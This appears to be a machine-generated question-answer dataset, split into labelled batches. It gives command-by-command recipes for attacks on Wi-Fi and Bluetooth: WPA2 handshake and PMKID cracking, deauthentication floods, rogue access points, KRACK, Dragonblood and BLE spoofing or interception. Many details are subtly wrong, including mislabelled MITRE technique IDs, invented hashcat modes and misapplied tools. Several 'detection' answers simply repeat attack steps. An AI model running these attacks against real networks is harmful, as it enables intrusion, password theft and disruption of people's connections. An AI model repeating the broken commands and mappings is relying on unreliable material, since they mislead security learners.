A: **Technique: Bluetooth Low Energy (BLE) Attack \u2014 T1590.001**

**Step 1 \u2014 Scan for BLE Devices:**  
```bash
# Use hcitool to scan for BLE devices
sudo hcitool lescan
```

**Step 2 \u2014 Connect and Pair with Device:**  
```bash
# Use gatttool to connect and pair with a device
gatttool -b <device_address> --interactive

# Inside the interactive mode, pair with the device:
pair
```

**Step 3 \u2014 Read Attributes or Perform Actions:**  
```bash
# Read characteristics or perform actions on the device
read-hnd 0x2a29
```

**Artifacts:**  
- List of BLE devices and their addresses.
- Connected and paired status with a specific device.
- Characteristic values read from the device.

**Cleanup:**  
No additional cleanup needed, as connections are closed after use.

=== BATCH 12 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and crack it offline?
A: **Technique: WPA2 Handshake Capture and Offline Cracking - T1590.001**

**Step 1 - Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 - Capture Handshake:**
```bash
# Start capturing packets
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Deauthenticate a client to force the handshake
sudo aireplay-ng -0 1 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 - Crack Handshake:**
```bash
# Use a wordlist to crack the captured WPA2 handshake
aircrack-ng capture-01.cap -w wordlist.txt
```

**Artifacts:**
- Captured .cap file containing the handshake.
- Cracked password if successful.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a good way to detect WPA2 Enterprise Evil Twin attacks?
A: **Technique: Evil Twin Detection - T1590.001**

**Step 1 - Reconnaissance:**
```bash
# Scan for wireless networks
sudo airodump-ng wlan0mon

# Identify the target network and note its BSSID, SSID, and channel.
```

**Step 2 - Compare MAC Addresses:**
```bash
# Use tools like `wifite` or `reaver` to scan for nearby APs with the same SSID.
sudo wifite --channel <channel> --bssid <BSSID>
```

**Step 3 - Analyze Network Traffic:**
```bash
# Check for anomalies in network traffic, such as different BSSIDs for the same SSID.
sudo airodump-ng wlan0mon --bssid <BSSID>
```

**Artifacts:**
- Multiple APs with the same SSID but different BSSIDs.
- Network IDS alerts for unexpected or duplicate SSIDs.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I perform a WPA2 deauthentication attack?
A: **Technique: WPA2 Deauthentication Attack - T1595.001**

**Step 1 - Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 - Deauthenticate Clients:**
```bash
# Deauthenticate all clients from the target network
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon

# Repeat as needed to keep clients disconnected.
```

**Artifacts:**
- Disconnected clients on the target network.
- Network IDS logs showing deauthentication events.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I set up a rogue access point?
A: **Technique: Rogue Access Point Setup - T1590.001**

**Step 1 - Configure Network Interface:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Set the second interface to managed mode
sudo ip link set wlan1 up
```

**Step 2 - Start Access Point:**
```bash
# Install `hostapd`
sudo apt install hostapd

# Configure `hostapd`
cat > /etc/hostapd/hostapd.conf << EOF
interface=wlan1
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start `hostapd`
sudo hostapd /etc/hostapd/hostapd.conf
```

**Artifacts:**
- New SSID "RogueWiFi" visible to wireless clients.
- Network IDS alerts for the new access point.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
sudo killall hostapd
rm /etc/hostapd/hostapd.conf
```
===PAIR===
Q: How can I perform a KRACK attack?
A: **Technique: Key Reinstallation Attacks (KRACK) - T1595.001**

**Step 1 - Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 - Capture Packets:**
```bash
# Start capturing packets
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Deauthenticate a client to force the handshake
sudo aireplay-ng -0 1 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 - Perform KRACK Attack:**
```bash
# Use `aireplay-ng` to replay packets and trigger the attack
sudo aireplay-ng --chopchop -r capture-01.cap wlan0mon

# Check for successful attacks in the output.
```

**Artifacts:**
- Captured .cap file containing the handshake.
- Successful KRACK attack indicated by packet replays.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack - T1590.001**

**Step 1 - Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
# Note: BSSID, channel, ESSID of target network
```

**Step 2 - Capture Packets:**
```bash
# Start capturing packets
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Deauthenticate a client to force the handshake
sudo aireplay-ng -0 1 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 - Perform Dragonblood Attack:**
```bash
# Use `hcxpcapngtool` to extract PMKIDs or PKEs from the capture file
hcxpcapngtool -z dragonblood.hccapx capture-01.cap

# Crack the extracted data using `hashcat`
hashcat -m 25427 dragonblood.hccapx wordlist.txt
```

**Artifacts:**
- Captured .cap file containing WPA3 packets.
- Extracted PMKIDs or PKEs in `dragonblood.hccapx`.
- Cracked password if successful.

**Cleanup:**
```bash
sudo airmon-ng stop wlan0mon
rm capture*
rm dragonblood.hccapx
```

=== BATCH 13 RETRY 0 ===
===PAIR===
Q: How can I capture a WPA2 handshake to perform offline cracking?
A: **Technique: WPA2 Handshake Capture \u2014 T1595.001 (Offline Cracking)**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Capture Handshake:**  
```bash
# Start capturing packets to find the handshake
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```

**Expected Artifacts/Telemetry:**
- `capture.cap` file containing the captured packets.
- Network monitoring tools may show increased activity or reconnections.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a method to deauthenticate clients from a WPA/WPA2 network?
A: **Technique: Deauthentication Attack \u2014 T1595.001 (WPA/WPA2 Deauthentication)**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Deauthenticate Clients:**  
```bash
# Send deauthentication packets to all clients on the network
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
```

**Expected Artifacts/Telemetry:**
- Network monitoring tools may show disconnections and reconnections.
- Client devices may display a message indicating loss of connection.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I set up a rogue access point to capture client data?
A: **Technique: Rogue Access Point \u2014 T1590.001 (Rogue AP)**

**Step 1 \u2014 Configure Wireless Adapter:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Set Up Fake AP:**  
```bash
# Install hostapd and dnsmasq
sudo apt install hostapd dnsmasq

# Configure hostapd
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0mon
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Configure dnsmasq for DHCP
cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan0mon
dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h
EOF

# Start the services
sudo hostapd /tmp/hostapd.conf &
sudo dnsmasq -C /tmp/dnsmasq.conf
```

**Expected Artifacts/Telemetry:**
- Network monitoring tools may show a new AP with the same ESSID.
- Clients may connect to the rogue AP and attempt to access the internet.

**Cleanup:**  
```bash
sudo killall hostapd dnsmasq
sudo airmon-ng stop wlan0mon
rm /tmp/hostapd.conf /tmp/dnsmasq.conf
```
===PAIR===
Q: How can I perform a KRACK attack on WPA2?
A: **Technique: Key Reinstallation Attack (KRACK) \u2014 T1595.001 (KRACK)**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Deauthenticate Clients:**  
```bash
# Send deauthentication packets to all clients on the network
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
```

**Step 3 \u2014 Capture Packets:**  
```bash
# Start capturing packets to find the handshake
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```

**Step 4 \u2014 Perform KRACK Attack:**  
```bash
# Use aireplay-ng to send duplicate key frames
sudo aireplay-ng -R 5 -a <BSSID> -c <client_MAC> wlan0mon
```

**Expected Artifacts/Telemetry:**
- Network monitoring tools may show retransmissions and potential data loss.
- Client devices may display a message indicating connection issues.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: How can I use PMKID attacks to crack WPA2 passwords?
A: **Technique: PMKID Attack \u2014 T1595.001 (PMKID Attacks)**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of the target network
```

**Step 2 \u2014 Capture PMKIDs:**  
```bash
# Start capturing packets to find PMKIDs
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```

**Expected Artifacts/Telemetry:**
- `capture.cap` file containing the captured packets.
- Network monitoring tools may show increased activity or reconnections.

**Step 3 \u2014 Crack PMKIDs:**  
```bash
# Use hashcat to crack the PMKIDs
hashcat -m 16800 capture.hccapx wordlist.txt
```

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is an effective way to map out wireless networks in a building?
A: **Technique: Wireless Network Mapping \u2014 T1546 (Network Reconnaissance)**

**Step 1 \u2014 Scan for Networks:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Perform a full scan of the area
sudo airodump-ng wlan0mon --scan
```

**Expected Artifacts/Telemetry:**
- List of all detected networks with BSSID, ESSID, channel, and signal strength.
- Network monitoring tools may show variations in signal strength as you move around.

**Step 2 \u2014 Analyze Results:**  
```bash
# Use a tool like NetSpot or Ekahau to visualize the data
```

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
```

=== BATCH 14 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking during authorized testing?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture the WPA2 handshake:**
```bash
# Start capturing packets for the target network
sudo airodump-ng -c <channel> -d <BSSID> wlan0mon --write output
```

**Step 3 \u2014 Deauthenticate a client to force a new handshake:**
```bash
# Deauthenticate a client
sudo aireplay-ng -0 2 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Crack the captured WPA2 PSK:**
```bash
# Use aircrack-ng to crack the handshake
sudo aircrack-ng output-01.kismet.csv
```

**Artifacts:**  
- Captured handshake files (e.g., `output-01.kismet.csv`)
- Cracked key if successful

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm output-01.kismet.csv
```
===PAIR===
Q: What is a good method to detect rogue access points in a network?
A: **Technique: Rogue Access Point Detection \u2014 T1590.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Scan for wireless networks
sudo nmap -sn --script broadcast-dns-sd-probe wlan0mon
```

**Step 2 \u2014 Compare known and unknown APs:**
- Check the output of `nmap` to identify any unfamiliar SSIDs or BSSIDs.
- Cross-reference with known network configurations.

**Artifacts:**  
- Network scan results indicating unfamiliar access points.

**Cleanup:**  
No specific cleanup required unless additional tools were used for deeper analysis.
===PAIR===
Q: How can I perform a Bluetooth Low Energy (BLE) attack during testing?
A: **Technique: BLE Advertising Spoofing \u2014 T1590.001**

**Step 1 \u2014 Scan for BLE devices:**
```bash
# Use hcitool to scan for BLE devices
sudo hcitool lescan
```

**Step 2 \u2014 Spoof a device:**
```bash
# Install bluepy for BLE operations
pip install bluepy

# Run a Python script to advertise as a spoofed device
python -c "from bluepy.btle import Peripheral, UUID; p = Peripheral(); p.advertise(UUID('180f'));"
```

**Artifacts:**  
- Devices may connect to the spoofed BLE device instead of the original.

**Cleanup:**  
```bash
# Stop the Python script if it's still running.
killall -9 python
```
===PAIR===
Q: How can I use KRACK (Key Reinstallation Attacks) during authorized testing?
A: **Technique: KRACK Attack \u2014 T1546**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
```

**Step 2 \u2014 Deauthenticate clients to trigger rekeying:**
```bash
# Deauthenticate clients
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
```

**Step 3 \u2014 Capture packets and analyze for KRACK indicators:**
```bash
# Use tcpdump or Wireshark to capture packets
tcpdump -i wlan0mon -w krack.pcap

# Analyze the pcap file for rekeying anomalies
krack-analysis.py krack.pcap
```

**Artifacts:**  
- Captured `.pcap` files with potential KRACK indicators.
- Logs or output from analysis tools.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm krack.pcap
```
===PAIR===
Q: How can I set up a rogue access point during testing?
A: **Technique: Rogue Access Point Setup \u2014 T1590.001**

**Step 1 \u2014 Configure wireless interface:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Create a new virtual interface for the rogue AP
sudo iw dev wlan0mon interface add wlan0ap type managed
```

**Step 2 \u2014 Set up the rogue AP:**
```bash
# Install hostapd
sudo apt install hostapd

# Configure hostapd
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0ap
driver=nl80211
ssid=RogueWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=roguepassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start hostapd
sudo hostapd /tmp/hostapd.conf &
```

**Artifacts:**  
- New access point with SSID "RogueWiFi" visible to clients.

**Cleanup:**  
```bash
sudo killall hostapd
sudo iw dev wlan0ap del
sudo airmon-ng stop wlan0mon
rm /tmp/hostapd.conf
```
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack during authorized testing?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
```

**Step 2 \u2014 Capture Dragonblood packets:**
```bash
# Use aircrack-ng to capture packets
sudo aircrack-ng -c <channel> -d <BSSID> wlan0mon --write dragonblood_output
```

**Step 3 \u2014 Deauthenticate clients to force rekeying:**
```bash
# Deauthenticate clients
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
```

**Step 4 \u2014 Crack the captured WPA3 PSK:**
```bash
# Use aircrack-ng to crack the Dragonblood packets
sudo aircrack-ng dragonblood_output-01.kismet.csv
```

**Artifacts:**  
- Captured Dragonblood packets (e.g., `dragonblood_output-01.kismet.csv`)
- Cracked key if successful

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm dragonblood_output-01.kismet.csv
```

=== BATCH 15 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking on a target network?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1595.001 (Offline Password Guessing)**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture the WPA2 handshake:**  
```bash
# Start capturing packets
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon &
```

**Step 3 \u2014 Deauthenticate clients to force re-authentication:**  
```bash
# Deauthenticate a client to capture the handshake
sudo aireplay-ng -0 1 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Stop capturing and crack the password:**  
```bash
# Stop airodump-ng
killall airodump-ng

# Crack the captured handshake using John the Ripper or Hashcat
john --wordlist=wordlist.txt capture-01.cap
```

**Artifacts:**
- Captured .cap files in the current directory.
- Cracked passwords logged by John the Ripper or Hashcat.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a good method to detect rogue access points on a network?
A: **Technique: Wireless Network Reconnaissance and Mapping \u2014 T1590.001 (Evil Twin AP)**

**Step 1 \u2014 Scan for wireless networks:**  
```bash
# Perform a basic scan to identify nearby networks
sudo iwlist wlan0 scan | grep -i "essid"
```

**Step 2 \u2014 Identify potential rogue access points:**  
```bash
# Compare the list of networks with known good ESSIDs and BSSIDs
# Look for discrepancies or unknown networks.
```

**Step 3 \u2014 Verify using airodump-ng:**  
```bash
# Use airodump-ng to get more details about each network
sudo airodump-ng wlan0 --scan
```

**Artifacts:**
- List of all visible SSIDs and BSSIDs.
- Potential rogue access points identified by discrepancies.

**Cleanup:**  
No additional cleanup required beyond normal wireless operations.
===PAIR===
Q: How can I perform a WPA2 deauthentication attack on a target network?
A: **Technique: WPA2 Deauthentication Attack \u2014 T1595.001 (Offline Password Guessing)**

**Step 1 \u2014 Identify the target network:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Deauthenticate clients:**  
```bash
# Send deauthentication packets to all clients on the network
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
```

**Artifacts:**
- Clients disconnect from the network.
- Network monitoring tools may show increased activity or reconnections.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I use PMKID attacks to crack WPA2 passwords?
A: **Technique: PMKID Attack \u2014 T1595.001 (Offline Password Guessing)**

**Step 1 \u2014 Put the wireless adapter in monitor mode:**  
```bash
sudo airmon-ng start wlan0
```

**Step 2 \u2014 Capture PMKIDs and handshakes:**  
```bash
# Start capturing packets with airodump-ng
sudo airodump-ng --bssid <BSSID> -c <channel> --output-format=csv -w pmkid_capture wlan0mon &
```

**Step 3 \u2014 Deauthenticate clients to force PMKID generation:**  
```bash
# Send deauthentication packets to all clients on the network
sudo aireplay-ng -0 10 -a <BSSID> wlan0mon
```

**Step 4 \u2014 Stop capturing and crack the PMKIDs:**  
```bash
# Kill airodump-ng process
killall airodump-ng

# Crack the captured PMKIDs using hashcat
hashcat -m 16800 pmkid_capture-01.csv wordlist.txt
```

**Artifacts:**
- Captured .csv files in the current directory.
- Cracked passwords logged by Hashcat.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm pmkid_capture*
```
===PAIR===
Q: What is a KRACK attack, and how can I exploit it on a WPA2 network?
A: **Technique: KRACK Attack \u2014 T1595.001 (Offline Password Guessing)**

**Step 1 \u2014 Identify the target network:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture the WPA2 handshake:**  
```bash
# Start capturing packets
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon &
```

**Step 3 \u2014 Deauthenticate clients to force re-authentication:**  
```bash
# Deauthenticate a client to capture the handshake
sudo aireplay-ng -0 1 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Stop capturing and crack the password using KRACK:**  
```bash
# Stop airodump-ng
killall airodump-ng

# Crack the captured handshake using hashcat with the KRACK attack mode
hashcat -m 25300 capture-01.cap wordlist.txt
```

**Artifacts:**
- Captured .cap files in the current directory.
- Cracked passwords logged by Hashcat.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: How can I perform a Bluetooth Low Energy (BLE) scan and identify nearby devices?
A: **Technique: BLE Scan \u2014 T1590.001 (Evil Twin AP)**

**Step 1 \u2014 Put the wireless adapter in monitor mode:**  
```bash
sudo hciconfig hci0 up
```

**Step 2 \u2014 Scan for BLE devices:**  
```bash
# Perform a BLE scan to identify nearby devices
sudo hcitool lescan
```

**Artifacts:**
- List of MAC addresses and names of nearby BLE devices.

**Cleanup:**  
No additional cleanup required beyond normal wireless operations.

=== BATCH 16 RETRY 0 ===
===PAIR===
Q: How can I perform a WPA2 handshake capture and offline cracking on a target network?
A: **Technique: WPA2 Handshake Capture and Offline Cracking \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Capture the WPA2 handshake:**  
```bash
# Start capturing packets
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon &
```

**Step 3 \u2014 Deauthenticate a client to force a new handshake:**  
```bash
# Deauthenticate the client
sudo aireplay-ng -deauth 5 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Stop capturing and crack the password:**  
```bash
# Stop airodump
killall airodump-ng

# Use John The Ripper to crack the WPA2 handshake
sudo john --wordlist=wordlist.txt capture-01.cap
```

**Artifacts:**  
- Captured `.cap` file with WPA2 handshake.
- Cracked password in `john.pot`.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm capture*
```
===PAIR===
Q: What is a good method to detect rogue access points on the network?
A: **Technique: Wireless Network Reconnaissance and Mapping \u2014 T1590.001**

**Step 1 \u2014 Scan for wireless networks:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover all networks
sudo airodump-ng wlan0mon
```

**Step 2 \u2014 Compare with known networks:**  
```bash
# List known BSSIDs and compare
cat known_bssids.txt
# Example: grep -Fwf known_bssids.txt capture-01.csv
```

**Step 3 \u2014 Use tools like `kismet` for more detailed mapping:**  
```bash
sudo kismet -c wlan0mon
```

**Artifacts:**  
- Captured `.csv` file with network details.
- Kismet log files for visual analysis.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I perform a WPA3 Dragonblood attack?
A: **Technique: WPA3 Dragonblood Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa3
# Note: BSSID, channel, ESSID of target WPA3 network
```

**Step 2 \u2014 Set up the attacker's interface:**  
```bash
# Configure the wireless interface
sudo ip link set wlan1 down
sudo iwconfig wlan1 mode monitor
sudo ip link set wlan1 up
```

**Step 3 \u2014 Start the attack with `wpa_supplicant`:**  
```bash
# Use a known password and attempt to connect
wpa_passphrase <SSID> <password> | sudo wpa_supplicant -B -i wlan1 -c /dev/stdin
```

**Step 4 \u2014 Check for successful connection:**  
```bash
# Verify the connection status
sudo iwconfig wlan1
```

**Artifacts:**  
- Successful or failed connection attempts.
- Logs from `wpa_supplicant` indicating the Dragonblood attack result.

**Cleanup:**  
```bash
sudo ip link set wlan1 down
sudo wpa_cli terminate
```
===PAIR===
Q: What is a KRACK attack, and how can I perform it on a WPA2 network?
A: **Technique: Key Reinstallation Attacks (KRACK) \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Deauthenticate the client to trigger reassociation:**  
```bash
# Deauthenticate the client
sudo aireplay-ng -deauth 5 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 3 \u2014 Capture packets with `tcpdump`:**  
```bash
# Start capturing packets
sudo tcpdump -i wlan0mon -w krack.pcapng
```

**Step 4 \u2014 Analyze the capture for KRACK:**  
```bash
# Use `tshark` to analyze the pcap file
tshark -r krack.pcapng -Y 'wlan.fc.retry == 1' | grep "Data"
```

**Artifacts:**  
- Captured `.pcapng` file with packets.
- Analysis results showing retransmitted data frames.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm krack.pcapng
```
===PAIR===
Q: How can I perform a PMKID attack on a WPA2 network?
A: **Technique: PMKID Attack \u2014 T1595.001**

**Step 1 \u2014 Reconnaissance:**  
```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Discover target network
sudo airodump-ng wlan0mon --encrypt wpa2
# Note: BSSID, channel, ESSID of target network
```

**Step 2 \u2014 Start capturing PMKIDs:**  
```bash
# Use `hcxpcapngtool` to capture PMKIDs
sudo airodump-ng -c <channel> --bssid <BSSID> -w pmkid wlan0mon &
```

**Step 3 \u2014 Deauthenticate the client to trigger PMKID generation:**  
```bash
# Deauthenticate the client
sudo aireplay-ng -deauth 5 -a <BSSID> -c <client_MAC> wlan0mon
```

**Step 4 \u2014 Stop capturing and convert to hash format:**  
```bash
# Stop airodump
killall airodump-ng

# Convert the capture file
hcxpcapngtool -z pmkid.hccapx pmkid-01.cap
```

**Step 5 \u2014 Crack the PMKID using `hashcat`:**  
```bash
# Use hashcat to crack the PMKID
hashcat -m 2500 pmkid.hccapx wordlist.txt
```

**Artifacts:**  
- Captured `.cap` file with PMKIDs.
- Converted `.hccapx` file for cracking.
- Cracked password in `hashcat.pot`.

**Cleanup:**  
```bash
sudo airmon-ng stop wlan0mon
rm pmkid*
```
===PAIR===
Q: Can you describe a scenario where Bluetooth Low Energy (BLE) attacks might be useful?
A: **Technique: BLE Attacks \u2014 T1590.001**

**Scenario:**  
You suspect that an attacker is using a BLE device to gather information about your network or devices.

**Step 1 \u2014 Scan for BLE devices:**  
```bash
# Use `bluetoothctl` to scan for nearby BLE devices
bluetoothctl power on
bluetoothctl scan on
```

**Step 2 \u2014 Connect to a target device and read its characteristics:**  
```bash
# Trust the device and connect
bluetoothctl trust <device_MAC>
bluetoothctl connect <device_MAC>

# Read characteristics
gatttool -b <device_MAC> --char-read -a <characteristic_handle>
```

**Step 3 \u2014 Perform a BLE Man-in-the-Middle (MITM) attack:**  
```bash
# Use `bluepy` to perform MITM
python ble_mitm.py <device_MAC>
```

**Artifacts:**  
- List of nearby BLE devices.
- Characteristics read from the target device.
- Intercepted data during the MITM attack.

**Cleanup:**  
```bash
bluetoothctl scan off
bluetoothctl disconnect <device_MAC>
```
These pairs cover various wireless attack techniques and provide detailed steps, expected outcomes, and cleanup instructions.

=== BATCH 17 RETRY 0 ===
===PAIR===
Q: Perform a WPA/WPA2 deauthentication attack on the network with BSSID `aa:bb:cc:dd:ee:ff`.
A: **Technique: WPA/WPA2 Deauthentication Attack — T1595.001**

```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Perform deauthentication attack
sudo aireplay-ng -0 10 -a aa:bb:cc:dd:ee:ff wlan0mon
```

**Expected Artifacts/Telemetry:**
- Network IDS: multiple disconnections from the target BSSID.
- Client logs: frequent reconnection attempts.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: How can I set up a rogue access point to capture WPA2 handshakes?
A: **Technique: Rogue Access Point — T1590.001**

```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Start the rogue AP
sudo hostapd /tmp/hostapd.conf &

# Capture packets with airodump-ng
sudo airodump-ng --bssid <rogue_BSSID> --channel <channel> -w captured wlan0mon &
```

**Expected Artifacts/Telemetry:**
- Network IDS: new APs with the same or similar SSIDs.
- Captured files: `.cap` files containing WPA2 handshakes.

**Cleanup Steps:**
```bash
sudo killall hostapd
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: Explain how to perform a PMKID attack and provide the commands needed.
A: **Technique: PMKID Attack — T1595.001**

```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Capture PMKIDs with airodump-ng
sudo airodump-ng --bssid <target_BSSID> --channel <channel> -w captured wlan0mon &
```

**Expected Artifacts/Telemetry:**
- Captured files: `.cap` files containing PMKIDs.
- Network IDS: increased traffic on the target channel.

**Cleanup Steps:**
```bash
sudo airmon-ng stop wlan0mon
```
===PAIR===
Q: Describe a scenario where you would use KRACK (Key Reinstallation Attacks) and how to exploit it.
A: **Technique: KRACK — T1595.001**

**Scenario:** A client reconnects to the same network after an interruption, such as waking from sleep.

```bash
# Put wireless adapter in monitor mode
sudo airmon-ng start wlan0

# Capture packets with airodump-ng
sudo airodump-ng --bssid <target_BSSID> --channel <channel> -w captured wlan0mon &
```

**Expected Artifacts/Telemetry:**
- Captured files: `.cap` files containing retransmitted data frames.
